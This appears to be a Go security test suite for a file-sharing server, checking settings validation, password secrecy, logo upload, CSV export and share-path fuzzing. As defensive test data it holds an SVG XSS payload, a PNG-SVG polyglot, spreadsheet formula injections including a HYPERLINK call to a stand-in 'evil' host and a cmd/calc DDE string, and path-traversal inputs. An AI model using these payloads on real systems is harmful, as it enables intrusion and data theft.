		"ext nul":           {"blocked_extensions": []string{"php\x00"}},
		"ext long":          {"blocked_extensions": []string{strings.Repeat("x", 33)}},
		"app name newline":  {"app_name": "a\nb"},
		"app name long":     {"app_name": strings.Repeat("x", 41)},
		"chunk > upload":    {"upload_chunk_size": "200MB", "max_upload_size": "100MB"},
		"abs < idle":        {"session_absolute_timeout": "10m", "session_idle_timeout": "1h"},
		"password min":      {"password_min_length": 7},
	} {
		r := put(body)
		if r.rec.Code != 400 || r.code(t) != "VALIDATION_FAILED" {
			t.Errorf("%s: %d %s", name, r.rec.Code, r.rec.Body.String())
			continue
		}
		e, _ := r.body["error"].(map[string]any)
		d, _ := e["details"].(map[string]any)
		if _, ok := d["key"]; !ok {
			t.Errorf("%s: no details.key: %s", name, r.rec.Body.String())
		}
	}
	// a valid list is normalised: lower case, no leading dot, deduplicated
	r := put(map[string]any{"blocked_extensions": "PHP, .Exe ;sh\nphp"})
	if r.rec.Code != 200 {
		t.Fatalf("list: %d %s", r.rec.Code, r.rec.Body.String())
	}
	found := false
	for _, it := range r.body["items"].([]any) {
		m := it.(map[string]any)
		if m["key"] == "blocked_extensions" {
			found = true
			if fmt.Sprint(m["value"]) != "[php exe sh]" || m["source"] != "override" {
				t.Fatalf("normalised list: %v", m)
			}
		}
	}
	if !found {
		t.Fatal("blocked_extensions missing")
	}
	// the override is live: a rename to .php is refused
	home := filepath.Join(env.cfg.StorageRoot, "admin")
	if err := os.WriteFile(filepath.Join(home, "a.txt"), []byte("x"), 0o640); err != nil {
		t.Fatal(err)
	}
	if rr := env.call(http.MethodPost, "/api/v1/files/rename", "203.0.113.5:1", map[string]any{"path": "/a.txt", "newName": "a.PHP"}, ahdr, ack); rr.rec.Code != 415 {
		t.Fatalf("blocked ext live: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	if rr := env.call(http.MethodPost, "/api/v1/admin/settings/reset", "203.0.113.5:1", map[string]any{"keys": []string{"blocked_extensions"}}, ahdr, ack); rr.rec.Code != 200 {
		t.Fatalf("reset: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	// the maximum int64 size is accepted and does not break relations or /auth/me
	if rr := put(map[string]any{"max_upload_size": int64(1<<62) + 1}); rr.rec.Code != 200 {
		t.Fatalf("huge size: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	if rr := env.call(http.MethodGet, "/api/v1/auth/me", "203.0.113.5:1", nil, nil, ack); rr.rec.Code != 200 {
		t.Fatalf("auth/me after huge size: %d", rr.rec.Code)
	}
	env.call(http.MethodPost, "/api/v1/admin/settings/reset", "203.0.113.5:1", map[string]any{"keys": []string{"max_upload_size"}}, ahdr, ack)
}

// (e)/(f) temporary passwords exist only in the one response: never in the
// server log, the audit table or notifications; reset revokes the sessions.
func TestReviewETemporaryPasswordNeverPersists(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	ctx := context.Background()
	r := env.call(http.MethodPost, "/api/v1/admin/users", "203.0.113.5:1", map[string]any{"username": "budi77", "displayName": "Budi 77"}, ahdr, ack)
	if r.rec.Code != 201 {
		t.Fatalf("create: %d %s", r.rec.Code, r.rec.Body.String())
	}
	temp, _ := r.body["temporaryPassword"].(string)
	if len(temp) != 16 {
		t.Fatalf("temp password %q", temp)
	}
	uid := r.body["user"].(map[string]any)["id"].(string)
	manual := "Manual-Sementara-2026!"
	if rr := env.call(http.MethodPost, "/api/v1/admin/users", "203.0.113.5:1", map[string]any{"username": "citra77", "temporaryPassword": manual}, ahdr, ack); rr.rec.Code != 201 {
		t.Fatalf("create manual: %d %s", rr.rec.Code, rr.rec.Body.String())
	}
	// budi77 logs in with the temporary password (must change) and is then reset by the admin
	lr, bck, _ := env.login(t, "budi77", temp, "203.0.113.9:1")
	if lr.rec.Code != 200 {
		t.Fatalf("login temp: %d %s", lr.rec.Code, lr.rec.Body.String())
	}
	r = env.call(http.MethodPost, "/api/v1/admin/users/"+uid+"/reset-password", "203.0.113.5:1", nil, ahdr, ack)
	if r.rec.Code != 200 || r.rec.Header().Get("Cache-Control") != "no-store" {
		t.Fatalf("reset: %d %v", r.rec.Code, r.rec.Header())
	}
	temp2, _ := r.body["temporaryPassword"].(string)
	if rr := env.call(http.MethodGet, "/api/v1/auth/me", "203.0.113.9:1", nil, nil, bck); rr.rec.Code != 401 {
		t.Fatalf("session after reset: %d", rr.rec.Code)
	}
	if lr2, _, _ := env.login(t, "budi77", temp, "203.0.113.9:1"); lr2.rec.Code == 200 {
		t.Fatal("old temporary password still works")
	}
	// nowhere else
	logs := env.logs.String()
	rows, _ := env.store.ListAudit(ctx, db.AuditFilter{Limit: 500})
	var audits strings.Builder
	for _, a := range rows {
		if a.DetailsJson != nil {
			audits.WriteString(*a.DetailsJson)
		}
		audits.WriteString(a.Action)
	}
	admin, _ := env.store.GetUserByUsername(ctx, "admin")
	notes, _ := env.store.ListNotifications(ctx, admin.ID, false, "", "", 100)
	var notesText strings.Builder
	for _, n := range notes {
		notesText.WriteString(n.Title)
		if n.Body != nil {
			notesText.WriteString(*n.Body)
		}
	}
	for _, secret := range []string{temp, temp2, manual} {
		if strings.Contains(logs, secret) {
			t.Errorf("temporary password in the server log")
		}
		if strings.Contains(audits.String(), secret) {
			t.Errorf("temporary password in the audit table")
		}
		if strings.Contains(notesText.String(), secret) {
			t.Errorf("temporary password in notifications")
		}
	}
	if !strings.Contains(audits.String(), `"generated":true`) || !strings.Contains(audits.String(), "user.reset_password") {
		t.Fatalf("audit rows missing: %s", audits.String())
	}
}

// (e) the logo is PNG by magic bytes: SVG (even with a PNG content type)
// is refused, a PNG-prefixed polyglot is served as image/png in a sandbox.
func TestReviewELogoOnlyPNG(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	upload := func(ct string, body []byte) resp {
		req := httptest.NewRequest(http.MethodPost, "/api/v1/admin/branding/logo", bytes.NewReader(body))
		req.RemoteAddr = "203.0.113.5:1"
		req.Header.Set("Content-Type", ct)
		for k, v := range ahdr {
			req.Header.Set(k, v)
		}
		req.AddCookie(ack)
		rec := httptest.NewRecorder()
		env.handler.ServeHTTP(rec, req)
		out := resp{rec: rec}
		_ = json.Unmarshal(rec.Body.Bytes(), &out.body)
		return out
	}
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>`)
	for _, ct := range []string{"image/svg+xml", "image/png", "application/octet-stream"} {
		if r := upload(ct, svg); r.rec.Code != 415 || r.code(t) != "UNSUPPORTED_TYPE" {
			t.Errorf("svg as %s: %d %s", ct, r.rec.Code, r.rec.Body.String())
		}
	}
	if r := upload("image/png", append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 8)...)); r.rec.Code != 415 {
		t.Errorf("truncated png: %d", r.rec.Code)
	}
	if r := upload("image/png", bytes.Repeat([]byte("A"), 600<<10)); r.rec.Code != 413 && r.rec.Code != 415 {
		t.Errorf("oversized: %d", r.rec.Code)
	}
	polyglot := append([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"), svg...)
	if r := upload("image/png", polyglot); r.rec.Code != 200 {
		t.Fatalf("png polyglot: %d %s", r.rec.Code, r.rec.Body.String())
	}
	r := env.call(http.MethodGet, "/api/v1/branding/logo", "198.51.100.1:1", nil, nil, nil)
	h := r.rec.Header()
	if r.rec.Code != 200 || h.Get("Content-Type") != "image/png" || h.Get("X-Content-Type-Options") != "nosniff" || !strings.Contains(h.Get("Content-Security-Policy"), "sandbox") {
		t.Fatalf("served logo headers: %d %v", r.rec.Code, h)
	}
	if rr := env.call(http.MethodDelete, "/api/v1/admin/branding/logo", "203.0.113.5:1", nil, ahdr, ack); rr.rec.Code != 204 {
		t.Fatalf("delete logo: %d", rr.rec.Code)
	}
}

// (f) CSV export: cells that would be evaluated by a spreadsheet are
// neutralised in every column, quoting stays RFC 4180.
func TestReviewEAuditCSVFormulaInjection(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	ctx := context.Background()
	hostile := []string{`=HYPERLINK("http://evil/?"&A1)`, "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(A1:A9)", "\t=1+1", "\r=cmd", `"=1"`, "=1,2", " =1"}
	for i, h := range hostile {
		det := fmt.Sprintf(`{"note":%q}`, h)
		if _, err := env.store.InsertAudit(ctx, sqlc.InsertAuditParams{At: db.Now(), ActorUsername: db.Ptr(h), Action: "review.e" + fmt.Sprint(i),
			TargetType: db.Ptr(h), TargetID: db.Ptr(h), Ip: h, UserAgent: h, DetailsJson: &det}); err != nil {
			t.Fatal(err)
		}
	}
	r := env.call(http.MethodGet, "/api/v1/admin/audit/export.csv?action=review.", "203.0.113.5:1", nil, nil, ack)
	if r.rec.Code != 200 || !strings.HasPrefix(r.rec.Header().Get("Content-Type"), "text/csv") {
		t.Fatalf("export: %d %v", r.rec.Code, r.rec.Header())
	}
	body := strings.TrimPrefix(r.rec.Body.String(), "\ufeff")
	if !strings.Contains(body, "\r\n") {
		t.Fatal("no CRLF records")
	}
	cr := csv.NewReader(strings.NewReader(body))
	cr.FieldsPerRecord = -1
	records, err := cr.ReadAll()
	if err != nil {
		t.Fatalf("csv parse: %v", err)
	}
	if len(records) != len(hostile)+1 {
		t.Fatalf("records %d", len(records))
	}
	for _, rec := range records[1:] {
		for col, cell := range rec {
			if col == 0 || col == 1 || cell == "" {
				continue
			}
			if strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
				t.Errorf("column %d starts with a formula character: %q", col, cell)
			}
			if col == 9 && !strings.HasPrefix(cell, "{") {
				t.Errorf("details not JSON: %q", cell)
			}
		}
	}
	// leading space is not a formula trigger and must stay verbatim
	verbatim := false
	for _, rec := range records[1:] {
		if rec[2] == " =1" {
			verbatim = true
		}
	}
	if !verbatim {
		t.Error("leading-space cell was altered")
	}
	_ = ahdr
}

// (g) logout-all and admin revoke: the other session dies, this one lives.
func TestReviewESessionsRevocation(t *testing.T) {
	env := newAuthEnv(t)
	ack, ahdr := readyAdmin(t, env)
	bck, bhdr := env.newUser(t, "budi", "Rahasia sekali 2026!")
	_, bck2, _ := env.login(t, "budi", "Rahasia sekali 2026!", "203.0.113.10:1")
	_, bck3, _ := env.login(t, "budi", "Rahasia sekali 2026!", "203.0.113.11:1")
	if r := env.call(http.MethodPost, "/api/v1/me/sessions/revoke-others", "203.0.113.9:1", nil, bhdr, bck); r.rec.Code != 204 {
		t.Fatalf("revoke others: %d %s", r.rec.Code, r.rec.Body.String())
	}
	if r := env.call(http.MethodGet, "/api/v1/auth/me", "203.0.113.10:1", nil, nil, bck2); r.rec.Code != 401 {
		t.Fatalf("other session: %d", r.rec.Code)
	}
	if r := env.call(http.MethodGet, "/api/v1/auth/me", "203.0.113.9:1", nil, nil, bck); r.rec.Code != 200 {
		t.Fatalf("this session: %d", r.rec.Code)
	}
	budi, _ := env.store.GetUserByUsername(context.Background(), "budi")
	if r := env.call(http.MethodPost, "/api/v1/admin/users/"+budi.ID+"/revoke-sessions", "203.0.113.5:1", nil, ahdr, ack); r.rec.Code != 204 {
		t.Fatalf("admin revoke: %d", r.rec.Code)
	}
	for _, ck := range []*http.Cookie{bck, bck3} {
		if r := env.call(http.MethodGet, "/api/v1/auth/me", "203.0.113.9:1", nil, nil, ck); r.rec.Code != 401 {
			t.Fatalf("after admin revoke: %d", r.rec.Code)
		}
	}
	rows, _ := env.store.ListAudit(context.Background(), db.AuditFilter{Action: strPtr("user.revoke_sessions"), Limit: 10})
	if len(rows) != 2 {
		t.Fatalf("revoke audit rows %d", len(rows))
	}
}

// Fuzz: guest-controlled path and token never crash the server or reach
// outside the shared folder.
func FuzzReviewEPublicPath(f *testing.F) {
	env := newAuthEnv(f)
	ck, hdr, _ := seedShareFixture(f, env)
	_, token := createShare(f, env, ck, hdr, map[string]any{"path": "/laporan"})
	for _, s := range []string{"/", "/2026", "/../rahasia.txt", "//rahasia.txt", "/%2e%2e/rahasia.txt", "/2026/../../rahasia.txt", "\x00", "/" + strings.Repeat("a", 300), "/ringkasan.txt/..", "/./"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, p string) {
		for _, route := range []string{"/list", "/stat", "/raw", "/content", "/download", "/thumb", "/media-info"} {
			req := httptest.NewRequest(http.MethodGet, pub(token, route), nil)
			q := req.URL.Query()
			q.Set("path", p)
			req.URL.RawQuery = q.Encode()
			req.RemoteAddr = "198.51.100.60:1"
			rec := httptest.NewRecorder()
			env.handler.ServeHTTP(rec, req)
			if rec.Code >= 500 && rec.Code != 503 && rec.Code != 501 { // 501: no thumbnail pipeline in the test env
				t.Fatalf("%s path=%q: %d %s", route, p, rec.Code, rec.Body.String())
			}
			if strings.Contains(rec.Body.String(), "di luar share") {
				t.Fatalf("%s path=%q leaked outside content", route, p)
			}
		}
	})
}

func FuzzReviewEPublicToken(f *testing.F) {
	env := newAuthEnv(f)
	ck, hdr, _ := seedShareFixture(f, env)
	_, token := createShare(f, env, ck, hdr, map[string]any{"path": "/laporan"})
	for _, s := range []string{token, token[:42], token + "A", "api", "tim-laporan", "..", "%2e%2e", strings.Repeat("x", 64), "\x00", "a b"} {
		f.Add(s)
	}
	var n atomic.Int64
	f.Fuzz(func(t *testing.T, tok string) {
		// rotate the client address so the anti-enumeration limiter does not hide the handler
		i := n.Add(1)
		remote := fmt.Sprintf("198.51.%d.%d:1", (i/256)%256, i%256)
		for _, suffix := range []string{"", "/list", "/unlock"} {
			method := http.MethodGet
			var body io.Reader
			if suffix == "/unlock" {
				method = http.MethodPost
				body = strings.NewReader(`{"password":"x"}`)
			}
			req := httptest.NewRequest(method, "http://host/api/v1/public/shares/x"+suffix, body)
			req.URL.Path = "/api/v1/public/shares/" + tok + suffix
			req.URL.RawPath = ""
			req.RemoteAddr = remote
			if body != nil {
				req.Header.Set("Content-Type", "application/json")
			}
			rec := httptest.NewRecorder()
			env.handler.ServeHTTP(rec, req)
			if rec.Code >= 500 && rec.Code != 503 {
				t.Fatalf("%s token=%q: %d %s", suffix, tok, rec.Code, rec.Body.String())
			}
			if tok != token && rec.Code == 200 && strings.Contains(rec.Body.String(), `"name":"laporan"`) {
				t.Fatalf("token %q resolved the share", tok)
			}
		}
	})
}
